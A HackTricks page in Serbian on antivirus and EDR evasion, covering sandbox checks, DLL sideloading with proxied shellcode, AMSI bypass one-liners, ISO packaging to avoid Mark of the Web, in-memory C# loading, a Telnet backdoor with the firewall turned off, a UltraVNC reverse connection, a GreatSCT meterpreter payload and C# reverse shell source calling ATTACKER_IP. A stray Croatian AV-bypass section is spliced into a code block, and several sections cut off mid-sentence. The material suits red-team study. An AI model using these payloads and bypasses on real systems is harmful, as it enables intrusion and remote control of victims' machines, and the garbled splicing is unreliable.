# Bypassiranje antivirusa (AV)

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

**Ovu stranicu je napisao** [**@m2rc\_p**](https://twitter.com/m2rc\_p)**!**

## **Metodologija za izbegavanje AV-a**

Trenutno, AV koristi različite metode za proveru da li je fajl zlonameran ili ne, statička detekcija, dinamička analiza i za naprednije EDR-ove, ponašajna analiza.

### **Statička detekcija**

Statička detekcija se postiže označavanjem poznatih zlonamernih stringova ili nizova bajtova u binarnom ili skriptnom fajlu, kao i izvlačenjem informacija iz samog fajla (npr. opis fajla, naziv kompanije, digitalni potpisi, ikona, kontrolna suma itd.). To znači da korišćenje poznatih javnih alata može dovesti do bržeg otkrivanja, jer su verovatno analizirani i označeni kao zlonamerni. Postoji nekoliko načina za zaobilaženje ovakve vrste detekcije:

* **Enkripcija**

Ako enkriptujete binarni fajl, AV neće moći da otkrije vaš program, ali će vam biti potreban neki vid učitavača za dešifrovanje i pokretanje programa u memoriji.

* **Obfuskacija**

Ponekad je dovoljno promeniti neke stringove u binarnom fajlu ili skriptu da bi prošao AV, ali ovo može biti vremenski zahtevan zadatak u zavisnosti od onoga što pokušavate da obfuskirate.

* **Prilagođeni alati**

Ako razvijate sopstvene alate, neće biti poznatih loših potpisa, ali će vam to oduzeti puno vremena i truda.

{% hint style="info" %}
Dobar način za proveru protiv statičke detekcije Windows Defender-a je [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). On deli fajl na više segmenata i zatim zadaje Defender-u da skenira svaki segment pojedinačno, na taj način može vam reći tačno koji su stringovi ili bajtovi označeni u vašem binarnom fajlu.
{% endhint %}

Toplo preporučujem da pogledate ovu [YouTube plejlistu](https://www.youtube.com/playlist?list=PLj05gPj8rk\_pkb12mDe4PgYZ5qPxhGKGf) o praktičnom izbegavanju AV-a.

### **Dinamička analiza**

Dinamička analiza se vrši kada AV pokreće vaš binarni fajl u pesku i prati zlonamerne aktivnosti (npr. pokušava da dešifruje i pročita lozinke vašeg pregledača, izvršava minidump na LSASS itd.). Ovo može biti malo složenije za rad, ali evo nekih stvari koje možete uraditi da biste izbegli peskiranje.

* **Pauza pre izvršenja** U zavisnosti od toga kako je implementirano, ovo može biti odličan način za zaobilaženje dinamičke analize AV-a. AV-ovi imaju vrlo kratko vreme za skeniranje fajlova kako ne bi ometali rad korisnika, pa korišćenje dugih pauza može poremetiti analizu binarnih fajlova. Problem je što mnogi AV-ovi peskari mogu preskočiti pauzu u zavisnosti od toga kako je implementirana.
* **Provera resursa mašine** Obično peskari imaju vrlo malo resursa za rad (npr. < 2GB RAM-a), inače bi mogli usporiti rad korisnikove mašine. Ovde takođe možete biti vrlo kreativni, na primer, proverom temperature CPU-a ili čak brzinom ventilatora, neće sve biti implementirano u peskiranju.
* **Provere specifične za mašinu** Ako želite da ciljate korisnika čije je radno mesto pridruženo domenu "contoso.local", možete proveriti domen računara da biste videli da li se podudara sa onim koji ste naveli, ako se ne podudara, možete naterati program da se zatvori.

Ispostavilo se da je ime računara u Microsoft Defender peskiranju HAL9TH, pa možete proveriti ime računara u vašem malveru pre detonacije, ako se ime podudara sa HAL9TH, to znači da ste unutar Defender-ovog peskiranja, pa možete naterati program da se zatvori.

<figure><img src="../.gitbook/assets/image (3) (6).png" alt=""><figcaption><p>izvor: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Još neki vrlo dobri saveti od [@mgeeky](https://twitter.com/mariuszbit) za borbu protiv peskiranja

<figure><img src="../.gitbook/assets/image (2) (1) (1) (2) (1).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev kanal</p></figcaption></figure>

Kao što smo već rekli u ovom postu, **javni alati** će se na kraju **otkriti**, pa se trebate zapitati nešto:

Na primer, ako želite da izvučete LSASS, **da li zaista morate koristiti mimikatz**? Ili biste mogli koristiti drugi manje poznati projekat koji takođe izvlači LSASS.

Pravi odgovor je verovatno ovaj drugi. Uzimajući mimikatz kao primer, verovatno je jedan od, ako ne i najviše označenih malvera od strane AV-a i EDR-a, dok je sam projekat super, takođe je noćna mora raditi s njim da biste izbegli AV-e, pa jednostavno potražite alternative za ono što pokušavate postići.

{% hint style="info" %}
Kada modifikujete svoje payload-e za izbegavanje, pobrinite se da **isključite automatsko slanje uzoraka** u defender-u, i molim vas, ozbiljno, **NE POSTAVLJAJTE NA VIRUSTOTAL** ako je vaš cilj postići izbegavanje na duže staze. Ako želite da proverite da li vaš payload biva otkriven određenim AV-om, instalirajte ga na virtuelnu mašinu, pokušajte isključiti automatsko slanje uzoraka i testirajte ga tamo dok ne budete zadovoljni rezultatom.
{% endhint %}

## EXE vs DLL

Kada god je moguće, uvek **prioritet daj
## DLL Sideloading & Proxying

**DLL Sideloading** iskorišćava redosled pretrage DLL fajlova koji se koristi od strane loadera tako što postavlja žrtvenu aplikaciju i zlonamerni payload zajedno.

Možete proveriti programe koji su podložni DLL Sideloading-u koristeći [Siofra](https://github.com/Cybereason/siofra) i sledeći powershell skript:

{% code overflow="wrap" %}
```powershell
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
{% endcode %}

Ova komanda će izlistati programe koji su podložni DLL preusmeravanju unutar "C:\Program Files\\" i DLL fajlove koje pokušavaju da učitaju.

Toplo preporučujem da **istražite programe koji su podložni DLL preusmeravanju/sideloadovanju sami**, ova tehnika je prilično neprimetna kada se pravilno koristi, ali ako koristite javno poznate programe koji su podložni DLL preusmeravanju, možete lako biti otkriveni.

Samo postavljanje zlonamernog DLL fajla sa imenom koje program očekuje da učita, neće učitati vaš payload, jer program očekuje određene funkcije unutar tog DLL fajla. Da biste rešili ovaj problem, koristićemo još jednu tehniku koja se zove **DLL Proxying/Forwarding**.

**DLL Proxying** prosleđuje pozive koje program pravi sa proxy (i zlonamernog) DLL fajla originalnom DLL fajlu, čime se očuva funkcionalnost programa i omogućava izvršavanje vašeg payloada.

Koristiću projekat [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) od [@flangvik](https://twitter.com/Flangvik/)

Ovo su koraci koje sam sledio:

{% code overflow="wrap" %}
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
{% endcode %}

Poslednja komanda će nam dati 2 fajla: šablon izvornog koda DLL-a i originalni preimenovani DLL.

<figure><img src="../.gitbook/assets/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
{% endcode %}

Ovo su rezultati:

<figure><img src="../.gitbook/assets/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

I naš shellcode (enkodiran sa [SGN](https://github.com/EgeBalci/sgn)) i proxy DLL imaju stopu otkrivanja 0/26 u [antiscan.me](https://antiscan.me)! To bih nazvao uspehom.

<figure><img src="../.gitbook/assets/image (11) (3).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
**Toplo preporučujem** da pogledate [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) o DLL Sideloading-u i takođe [ippsec-ov video](https://www.youtube.com/watch?v=3eROsG\_WNpE) da biste saznali više o onome o čemu smo detaljnije diskutovali.
{% endhint %}

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze je alatka za payload koja zaobilazi EDR-ove koristeći suspendovane procese, direktne sistemski pozive i alternativne metode izvršavanja`

Možete koristiti Freeze da učitate i izvršite svoj shellcode na prikriven način.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../.gitbook/assets/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Izbegavanje je samo igra mačke i miša, ono što danas funkcioniše može biti otkriveno sutra, zato se nikada ne oslanjajte samo na jedan alat, ako je moguće, pokušajte da kombinujete više tehnika izbegavanja.
{% endhint %}

## AMSI (Anti-Malware Scan Interface)

AMSI je kreiran da spreči "[fileless malware](https://en.wikipedia.org/wiki/Fileless\_malware)". Na početku, AV-ovi su bili sposobni samo da skeniraju **fajlove na disku**, pa ako biste nekako izvršili payload **direktno u memoriji**, AV ne bi mogao ništa da uradi da to spreči, jer nije imao dovoljno vidljivosti.

AMSU funkcionalnost je integrisana u ove komponente Windows-a.

* User Account Control, ili UAC (elevacija EXE, COM, MSI ili ActiveX instalacija)
* PowerShell (skripte, interaktivna upotreba i dinamička evaluacija koda)
* Windows Script Host (wscript.exe i cscript.exe)
* JavaScript i VBScript
* Office VBA makroi

To omogućava antivirusnim rešenjima da inspektuju ponašanje skripti izlažući sadržaj skripti u obliku koji nije enkriptovan niti obfuskiran.

Pokretanje `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` će proizvesti sledeće upozorenje na Windows Defender-u.

<figure><img src="../.gitbook/assets/image (4) (5).png" alt=""><figcaption></figcaption></figure>

Primetite kako dodaje `amsi:` i zatim putanju do izvršnog fajla iz kojeg je skripta pokrenuta, u ovom slučaju powershell.exe

Nismo spustili nijedan fajl na disk, ali smo ipak uhvaćeni u memoriji zbog AMSI-ja.

Postoji nekoliko načina da se zaobiđe AMSI:

* **Obfuskacija**

Pošto AMSI uglavnom radi sa statičkim detekcijama, modifikovanje skripti koje pokušavate da učitate može biti dobar način za izbegavanje detekcije.

Međutim, AMSI ima sposobnost deobfuskacije skripti čak i ako ima više slojeva, pa obfuskacija može biti loša opcija u zavisnosti od toga kako je urađena. To čini izbegavanje ne tako jednostavnim. Ipak, ponekad je dovoljno promeniti nekoliko imena promenljivih i bićete sigurni, pa zavisi koliko nešto bude označeno.

* **AMSI Bypass**

Pošto se AMSI implementira učitavanjem DLL-a u powershell (takođe cscript.exe, wscript.exe, itd.) proces, lako je manipulisati njime čak i ako se pokreće kao korisnik bez privilegija. Zbog ove greške u implementaciji AMSI-ja, istraživači su pronašli više načina za izbegavanje AMSI skeniranja.

**Prisiljavanje greške**

Prisiljavanje inicijalizacije AMSI-ja da ne uspe (amsiInitFailed) rezultiraće da se ne pokrene skeniranje za trenutni proces. Ovo je prvobitno otkrio [Matt Graeber](https://twitter.com/mattifestation) i Microsoft je razvio potpis da spreči širu upotrebu.

{% code overflow="wrap" %}
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
{% endcode %}

Sve što je bilo potrebno bila je jedna linija powershell koda da bi se AMSI onemogućio za trenutni powershell proces. Ova linija je naravno označena od strane AMSI-a, pa je potrebna neka modifikacija kako bi se koristila ova tehnika.

Evo modifikovanog AMSI bypass-a koji sam preuzeo sa ovog [Github Gist-a](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```powershell
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
**Memory Patching**

Ova tehnika je prvobitno otkrivena od strane [@RastaMouse](https://twitter.com/\_RastaMouse/) i uključuje pronalaženje adrese za funkciju "AmsiScanBuffer" u amsi.dll (odgovornu za skeniranje korisničkog unosa) i prepisivanje instrukcija da vrati kod za E\_INVALIDARG. Na taj način, rezultat stvarnog skeniranja će biti 0, što se tumači kao čist rezultat.

{% hint style="info" %}
Molimo pročitajte [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) za detaljnije objašnjenje.
{% endhint %}

Postoji i mnogo drugih tehnika koje se koriste za zaobilaženje AMSI sa powershellom, pogledajte [**ovu stranicu**](basic-powershell-for-pentesters/#amsi-bypass) i [ovaj repozitorijum](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) da biste saznali više o njima.

Ili ovaj skript koji će putem memory patchinga izmeniti svaki novi Powersh

## Obfuscation

Postoji nekoliko alata koji se mogu koristiti za **obfuskaciju C# čistog koda**, generisanje **metaprogramskih šablona** za kompajliranje binarnih fajlova ili **obfuskaciju kompajliranih binarnih fajlova**, kao što su:

* [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuskator**
* [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Cilj ovog projekta je pružanje open-source verzije [LLVM](http://www.llvm.org/) kompilacionog paketa koji može obezbediti povećanu sigurnost softvera putem [obfuskacije koda](http://en.wikipedia.org/wiki/Obfuscation\_\(software\)) i zaštite od manipulacije.
* [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstrira kako koristiti `C++11/14` jezik za generisanje obfuskiranog koda tokom kompilacije, bez korišćenja bilo kakvog spoljnog alata i bez modifikacije kompajlera.
* [**obfy**](https://github.com/fritzone/obfy): Dodaje sloj obfuskiranih operacija generisanih pomoću C++ template metaprogramming framework-a, što će otežati život osobi koja želi da probije aplikaciju.
* [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz je x64 binarni obfuskator koji može obfuskirati različite vrste pe fajlova, uključujući: .exe, .dll, .sys
* [**metame**](https://github.com/a0rtega/metame): Metame je jednostavan engine za metamorfni kod za proizvoljne izvršne fajlove.
* [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator je framework za obfuskaciju koda na nivou asemblerskog koda za jezike podržane od strane LLVM-a koristeći ROP (return-oriented programming). ROPfuscator obfuskira program na nivou asemblerskog koda transformišući redovne instrukcije u ROP lance, narušavajući našu prirodnu predstavu normalnog kontrolnog toka.
* [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt je .NET PE Crypter napisan u Nim-u
* [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor može pretvoriti postojeći EXE/DLL u shellcode, a zatim ih učitati

## SmartScreen & MoTW

Možda ste videli ovaj ekran prilikom preuzimanja nekih izvršnih fajlova sa interneta i njihovog pokretanja.

Microsoft Defender SmartScreen je mehanizam za bezbednost koji ima za cilj da zaštiti krajnjeg korisnika od pokretanja potencijalno zlonamernih aplikacija.

<figure><img src="../.gitbook/assets/image (1) (4).png" alt=""><figcaption></figcaption></figure>

SmartScreen uglavnom radi na osnovu reputacije, što znači da će neobično preuzete aplikacije pokrenuti SmartScreen i time upozoriti i sprečiti krajnjeg korisnika da pokrene fajl (mada fajl i dalje može biti pokrenut klikom na More Info -> Run anyway).

**MoTW** (Mark of The Web) je [NTFS Alternate Data Stream](https://en.wikipedia.org/wiki/NTFS#Alternate\_data\_stream\_\(ADS\)) sa imenom Zone.Identifier koji se automatski kreira prilikom preuzimanja fajlova sa interneta, zajedno sa URL-om sa kojeg je preuzet.

<figure><img src="../.gitbook/assets/image (13) (3).png" alt=""><figcaption><p>Provera Zone.Identifier ADS za fajl preuzet sa interneta.</p></figcaption></figure>

{% hint style="info" %}
Važno je napomenuti da izvršni fajlovi potpisani sa **pouzdanim** sertifikatom **neće pokrenuti SmartScreen**.
{% endhint %}

Veoma efikasan način da se spreči dodavanje Mark of The Web oznake na vaše payloade je da ih zapakujete unutar neke vrste kontejnera kao što je ISO. Ovo se dešava zato što Mark-of-the-Web (MOTW) **ne može** biti primenjen na **ne-NTFS** volumene.

<figure><img src="../.gitbook/assets/image (12) (2) (2).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) je alat koji pakuje payloade u izlazne kontejnere kako bi izbegao Mark-of-the-Web.

Primer korišćenja:
```powershell
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Evo demo za zaobilaženje SmartScreen-a pakovanjem payloada unutar ISO datoteka koristeći [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../.gitbook/assets/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## C# Refleksija skupštine

Učitavanje C# binarnih datoteka u memoriju poznato je već neko vreme i i dalje je veoma dobar način za pokretanje alata za post-eksploataciju bez otkrivanja od strane AV.

Pošto će payload biti učitan direktno u memoriju bez dodira sa diskom, moraćemo samo da se brinemo o zakrpi AMSI za ceo proces.

Većina C2 okvira (sliver, Covenant, metasploit, CobaltStrike, Havoc, itd.) već omogućava izvršavanje C# skupština direktno u memoriji, ali postoje različiti načini za to:

* **Fork\&Run**

Uključuje **pokretanje novog žrtvenog procesa**, ubacivanje zlonamernog koda za post-eksploataciju u taj novi proces, izvršavanje zlonamernog koda i kada završi, ubijanje novog procesa. Ovo ima svoje prednosti i nedostatke. Prednost metode fork i run je što se izvršavanje dešava **van** našeg Beacon implant procesa. To znači da ako nešto pođe po zlu ili bude otkriveno u našoj post-eksploataciji, postoji **mnogo veća šansa** da naš **implant preživi**. Nedostatak je što postoji **veća šansa** da budete otkriveni od strane **ponašajnih detekcija**.

<figure><img src="../.gitbook/assets/image (7) (1) (3).png" alt=""><figcaption></figcaption></figure>

* **Inline**

Radi se o ubacivanju zlonamernog koda za post-eksploataciju **u sopstveni proces**. Na ovaj način možete izbeći kreiranje novog procesa i skeniranje od strane AV, ali nedostatak je što ako nešto pođe po zlu prilikom izvršavanja vašeg payloada, postoji **mnogo veća šansa** da **izgubite svoj beacon** jer bi mogao da se sruši.

<figure><img src="../.gitbook/assets/image (9) (3) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Ako želite da pročitate više o učitavanju C# skupština, pogledajte ovaj članak [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) i njihov InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))
{% endhint %}

Takođe možete učitati C# skupštine **iz PowerShell-a**, pogledajte [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) i [S3cur3th1sSh1t-ov video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Korišćenje drugih programskih jezika

Kao što je predloženo u [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), moguće je izvršiti zlonamerni kod koristeći druge jezike tako što se kompromitovanom mašinom omogući pristup **interpreter okruženju instaliranom na SMB deljenom resursu pod kontrolom napadača**.&#x20;

Omogućavanjem pristupa interpreter binarnim datotekama i okruženju na SMB deljenom resursu, možete **izvršiti proizvoljni kod na ovim jezicima unutar memorije** kompromitovane mašine.

Repozitorijum ukazuje: Defender i dalje skenira skripte, ali korišćenjem Go, Java, PHP itd. imamo **veću fleksibilnost za zaobilaženje statičkih potpisa**. Testiranje sa nasumičnim neobfuskiranim skriptama za obrnutu vezu na ovim jezicima pokazalo se uspešnim.

## Napredne tehnike izbegavanja

Izbegavanje je veoma komplikovana tema, ponekad morate uzeti u obzir mnoge različite izvore telemetrije u samo jednom sistemu, tako da je gotovo nemoguće ostati potpuno neprimećen u zrelim okruženjima.

Svako okruženje sa kojim se suočite imaće svoje prednosti i slabosti.

Toplo preporučujem da pogledate ovaj govor od [@ATTL4S](https://twitter.com/DaniLJ94), da biste dobili uvid u napredne tehnike izbegavanja.

{% embed url="https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo" %}

Ovo je takođe još jedan odličan govor od [@mariuszbit](https://twitter.com/mariuszbit) o Izbegavanju u Dubini.

{% embed url="https://www.youtube.com/watch?v=IbA7Ung39o4" %}

## **Stare tehnike**

### **Proverite koje delove Defender pronalazi kao zlonamerne**

Možete koristiti [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) koji će **ukloniti delove binarnog koda** dok ne **otkrije koji deo Defender** pronalazi kao zlonameran i podeliti ga sa vama.\
Još jedan alat koji radi **isto je** [**avred**](https://github.com/dobin/avred) sa otvorenim vebom koji nudi uslugu na [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Do Windows10, svi Windows-i su dolazili sa **Telnet serverom** koji ste mogli instalirati (kao administrator) tako što ste uradili:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Neka se **pokrene** prilikom pokretanja sistema i **pokreni** ga sada:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Promena telnet porta** (stealth) i onemogućavanje firewall-a:

Da biste promenili telnet port, možete slediti sledeće korake:

1. Otvorite `regedit` (Registry Editor).
2. Pronađite ključ registra `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Telnet\Parameters`.
3. Kreirajte novu DWORD vrednost sa nazivom `Port` (ako već ne postoji).
4. Dodelite željeni broj porta (npr. 1234) kao vrednost DWORD-a.
5. Sačuvajte promene i zatvorite Registry Editor.

Da biste onemogućili firewall, možete slediti sledeće korake:

1. Otvorite Control Panel (Kontrolna tabla).
2. Pronađite opciju "Windows Defender Firewall" (Zaštitni zid Windows Defender).
3. Kliknite na "Turn Windows Defender Firewall on or off" (Uključi ili isključi Zaštitni zid Windows Defender).
4. Odaberite opciju "Turn off Windows Defender Firewall" (Isključi Zaštitni zid Windows Defender) za obe mreže (Public i Private).
5. Sačuvajte promene.

Napomena: Onemogućavanje firewall-a može ugroziti sigurnost sistema. Preporučuje se da se ova mera primeni samo u kontrolisanim okruženjima i uz odgovarajuće mere zaštite.
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Preuzmite ga sa: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (želite binarne preuzimanja, ne instalaciju)

**NA HOSTU**: Izvršite _**winvnc.exe**_ i konfigurišite server:

* Omogućite opciju _Disable TrayIcon_
* Postavite lozinku u _VNC Password_
* Postavite lozinku u _View-Only Password_

Zatim premestite binarni fajl _**winvnc.exe**_ i **novokreirani** fajl _**UltraVNC.ini**_ unutar **žrtve**

#### **Reverzna veza**

**Napadač** treba da **izvrši unutar** svog **hosta** binarni fajl `vncviewer.exe -listen 5900` tako da bude **spreman** da uhvati reverznu **VNC vezu**. Zatim, unutar **žrtve**: Pokrenite winvnc daemon `winvnc.exe -run` i pokrenite `winwnc.exe [-autoreconnect] -connect <napadačeva_ip>::5900`

**UPOZORENJE:** Da biste ostali neprimetni, ne smete raditi nekoliko stvari

* Ne pokrećite `winvnc` ako već radi ili ćete pokrenuti [popup](https://i.imgur.com/1SROTTl.png). Proverite da li radi sa `tasklist | findstr winvnc`
* Ne pokrećite `winvnc` bez `UltraVNC.ini` u istom direktorijumu ili će se otvoriti [prozor za konfiguraciju](https://i.imgur.com/rfMQWcf.png)
* Ne pokrećite `winvnc -h` za pomoć ili ćete pokrenuti [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Preuzmite ga sa: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Unutar GreatSCT-a:

## AV Bypass

### Uvod

Kada se bavite testiranjem penetracije ili izradom zlonamjernog softvera, često ćete se suočiti s antivirusnim programima koji pokušavaju otkriti i blokirati vaše zlonamjerne aktivnosti. Da biste uspješno izbjegli otkrivanje, morate koristiti tehnike zaobilaženja antivirusnih programa (AV bypass).

### Tehnike zaobilaženja AV-a

#### 1. Korištenje kriptiranja

Kriptiranje je jedna od najučinkovitijih tehnika zaobilaženja AV-a. Možete kriptirati svoj zlonamjerni kod kako biste ga učinili nečitljivim za antivirusne programe. Postoji nekoliko alata i tehnika koje možete koristiti za kriptiranje, kao što su kriptiranje XOR, AES i RSA.

#### 2. Polimorfizam

Polimorfizam je tehnika koja omogućuje da se zlonamjerni kod mijenja svaki put kada se izvršava, čime se izbjegava otkrivanje od strane antivirusnih programa. Možete koristiti alate poput Veil-Evasion ili Shellter za generiranje polimorfne zlonamjerne datoteke.

#### 3. Metasploitov bypass AV-a

Metasploit ima nekoliko modula koji su posebno dizajnirani za zaobilaženje antivirusnih programa. Možete koristiti ove module kako biste generirali zlonamjerne datoteke koje će proći nezapaženo od strane antivirusnih programa.

#### 4. Korištenje packera

Packeri su alati koji omogućuju kompresiju i kriptiranje zlonamjernog koda. Korištenje packera može pomoći u zaobilaženju antivirusnih programa jer mijenja strukturu zlonamjernog koda i otežava njegovo otkrivanje.

#### 5. Izrada vlastitog AV bypass-a

Ako želite biti sigurni da će vaš zlonamjerni kod proći nezapaženo od strane antivirusnih programa, možete izraditi vlastiti AV bypass. Ovo uključuje proučavanje antivirusnih programa i identifikaciju njihovih slabosti kako biste mogli izbjeći njihovo otkrivanje.

### Zaključak

Zaobilaženje antivirusnih programa je ključno za uspješno izvođenje testiranja penetracije ili izradu zlonamjernog softvera. Korištenje tehnika kao što su kriptiranje, polimorfizam, Metasploitov bypass AV-a, packeri i izrada vlastitog AV bypass-a može vam pomoći da izbjegnete otkrivanje od strane antivirusnih programa i postignete svoje ciljeve.
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Sada **pokrenite lister** sa `msfconsole -r file.rc` i **izvršite** **xml payload** sa:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Trenutni zaštitnik će vrlo brzo prekinuti proces.**

### Kompajliranje naše sopstvene reverzne ljuske

https://medium.com/@Bank\_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Prva C# reverzna ljuska

Kompajlirajte je sa:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Koristite ga sa:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
